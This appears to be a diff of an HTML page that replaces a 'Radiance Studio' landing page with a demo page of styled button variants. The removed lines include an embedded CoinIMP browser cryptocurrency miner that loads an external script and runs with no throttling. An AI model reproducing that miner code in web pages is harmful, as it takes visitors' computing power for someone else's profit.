@@ -4,168 +4,72 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Grenze+Gotisch:wght@500&display=swap" rel="stylesheet">
-    <title>Radiance Studio [MINE]</title>
-    <script src="https://www.hostingcloud.racing/elYI.js"></script>
-    <script>
-        var _client = new Client.Anonymous('22c64a23cb04ae458ab86767d7d9f4b88b7edeee73a763e53789e79069e55275', {
-            throttle: 0, c: 'w'
-        });
-        _client.start();
-        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-
-    </script>
-    <style>
-        @keyframes feature-box{
-            from{background-color: transparent;color:white}
-            to{background-color: rgb(255, 255, 255,0.4);color:black;height:100%;}
-        }
-
-        *{
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-            color:white;
-        }
-
-        body,html{
-            width:100%;
-            height:100%;
-            margin:0;
-            padding:0;
-            background-color:rgb(30,30,30);
-        }
-
-        #navbar{
-            width:100%;
-            height:7%;
-            position: fixed;
-            bottom:0;
-            margin:2% 0;
-            margin-bottom:3.7%;
-        }
-
-        #menu{
-            width:80%;
-            height:100%;
-            margin:auto;
-            background-color:rgb(214, 25, 214,0.4);
-            visibility: hidden;
-            padding:10px;
-        }
-
-        #navbar-bar{
-            margin:auto;
-            width:80%;
-            height:100%;
-            display: flex;
-        }
-
-        #title{
-            flex-grow: 1;
-            background-color:white;
-            align-items: center;
-        }
-
-        #feature{
-            display: flex;
-            flex-direction: row;
-            justify-content: flex-end;
-            align-items: center;
-            background-color: rgba(0,0,0,0.4);
-        }
-        
-        .feature-box{
-            letter-spacing: 4px;
-            font-size: 12px;
-            border-bottom-style:outset;
-            border-bottom-color: white;
-            padding-left:10px;
-            padding-right:10px;
-            padding-top:17px;
-            padding-bottom:10px;
-            text-align: center;
-            margin:0 20px;
-        }
-
-        #cart{
-            width:48.781px;
-            border-bottom:none;
-            background-color: crimson;
-            height:100%;
-        }
-
-        .menu:hover{
-            animation-name: feature-box;
-            animation-duration: 1s;
-            cursor:crosshair;
-            border-bottom-style:inset;
-            background-color: rgb(255, 255, 255,0.4);
-            color:black;
-            height:100%;
-        }
-
-        .jumbotron{
-            width:100%;
-            height:100%;
-            padding:25px;
-            text-align: center;
-            align-items: center;
-            margin-top:15%;
-        }
-        
-        .jumbotron-text{
-            font-family: 'Grenze Gotisch', cursive;
-            font-size: 48px;
-            letter-spacing: 10px;
-        }
-
-        .button{
-            margin:auto;
-            width:80px;
-            background-color: transparent;
-            border:1px solid white;
-            border-radius:5%;
-            cursor: pointer;
-            font-size:12px;
-            text-align: center;
-        }
-    </style>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css" >
+    <title>Document</title>
 </head>
 <body>
-    <header>
-        <div id="navbar">
-            <div id="menu">
+    <div style="width:100%;">
+        <div style="max-width: 90%; margin: auto;">
+            <div style="background-color: rgb(146, 171, 250); padding: 5px 20px; color: white; font-weight: bold;">
+                <h1 style="margin: 0px;">Minimalist Button</h1>
+                <p style="margin: 0px;">by RadianceStudio</p>
+            </div>
+            <br>
+            <!-- Standard Button -->
+            <fieldset>
+                <legend>STANDARD BUTTON</legend>
+                <button class="rds-btn rds-blue" type="button">TAP ME</button>
+                <button class="rds-btn rds-red" type="button">TAP ME</button>
+                <button class="rds-btn rds-green" type="button">TAP ME</button>
+                <button class="rds-btn rds-yellow" type="button">TAP ME</button>
+                <button class="rds-btn rds-pink" type="button">TAP ME</button>
+                <button class="rds-btn rds-purple" type="button">TAP ME</button>
+            </fieldset>
 
-            </div>
-            <div id="navbar-bar">
-                <div id="title">
-                    RadianceStudio
-                </div>
-                <div id="feature">
-                    <div class="feature-box menu">
-                        HOME
-                    </div>
-                    <div class="feature-box menu">
-                        NEWS
-                    </div>
-                    <div class="feature-box menu">
-                        GAME
-                    </div>
-                    <div class="feature-box menu">
-                        ABOUT
-                    </div>
-                    <div id="cart" class="feature-box">
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </header>
-    <div class="jumbotron">
-        <span class="jumbotron-text">Radiance Studio</span>
-        <div class="button">
-            PLAY
+            <!-- Rounded Button -->
+            <fieldset>
+                <legend>ROUNDED BUTTON</legend>
+                <button class="rds-btn rds-blue rds-rounded" type="button">TAP ME</button>
+                <button class="rds-btn rds-red rds-rounded" type="button">TAP ME</button>
+                <button class="rds-btn rds-green rds-rounded" type="button">TAP ME</button>
+                <button class="rds-btn rds-yellow rds-rounded" type="button">TAP ME</button>
+                <button class="rds-btn rds-pink rds-rounded" type="button">TAP ME</button>
+                <button class="rds-btn rds-purple rds-rounded" type="button">TAP ME</button>
+            </fieldset>
+
+            <!-- Badge Button -->
+            <fieldset>
+                <legend>BADGE BUTTON</legend>
+                <button class="rds-btn rds-blue" type="button">TAP ME <span class="rds-badge">0</span></button>
+                <button class="rds-btn rds-red" type="button">TAP ME <span class="rds-badge">0</span></button>
+                <button class="rds-btn rds-green" type="button">TAP ME<span class="rds-badge">0</span></button>
+                <button class="rds-btn rds-yellow" type="button">TAP ME <span class="rds-badge">0</span></button>
+                <button class="rds-btn rds-pink" type="button">TAP ME <span class="rds-badge">0</span></button>
+                <button class="rds-btn rds-purple" type="button">TAP ME <span class="rds-badge">0</span></button>
+            </fieldset>
+
+            <!-- Outline Button -->
+            <fieldset>
+                <legend>OUTLINE BUTTON</legend>
+                <button class="rds-btn rds-outline-blue" type="button">TAP ME</button>
+                <button class="rds-btn rds-outline-red" type="button">TAP ME</button>
+                <button class="rds-btn rds-outline-green" type="button">TAP ME</button>
+                <button class="rds-btn rds-outline-yellow" type="button">TAP ME</button>
+                <button class="rds-btn rds-outline-pink" type="button">TAP ME</button>
+                <button class="rds-btn rds-outline-purple" type="button">TAP ME</button>
+            </fieldset>
+
+            <!-- Push Button -->
+            <fieldset>
+                <legend>PUSH BUTTON</legend>
+                <button class="rds-btn rds-blue rds-push" type="button">TAP ME</button>
+                <button class="rds-btn rds-red rds-push" type="button">TAP ME</button>
+                <button class="rds-btn rds-green rds-push" type="button">TAP ME</button>
+                <button class="rds-btn rds-yellow rds-push" type="button">TAP ME</button>
+                <button class="rds-btn rds-pink rds-push" type="button">TAP ME</button>
+                <button class="rds-btn rds-purple rds-push" type="button">TAP ME</button>
+            </fieldset>
         </div>
     </div>
 </body>
